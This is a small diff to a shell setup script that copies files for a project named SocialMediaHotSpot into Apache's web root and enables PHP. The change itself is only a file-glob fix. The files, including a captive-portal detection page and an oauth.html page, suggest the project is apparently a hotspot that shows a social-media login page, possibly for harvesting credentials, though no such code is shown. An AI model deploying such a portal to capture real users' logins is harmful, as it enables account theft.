@@ -8,7 +8,7 @@ mv /root/SocialMediaHotSpot/000-default.conf /etc/apache2/sites-available/000-de
 mv /root/SocialMediaHotSpot/index.html /var/www/html/index.html
 mv /root/SocialMediaHotSpot/hotspot-detect.html /var/www/html/hotspot-detect.html
 mv /root/SocialMediaHotSpot/redirect /var/www/html/redirect
-mv /root/SocialMediaHotSpot/static /var/www/html/
+mv /root/SocialMediaHotSpot/static* /var/www/html/
 mv /root/SocialMediaHotSpot/oauth.html /var/www/html/oauth.html
 a2enmod php7.2
 systemctl restart apache2
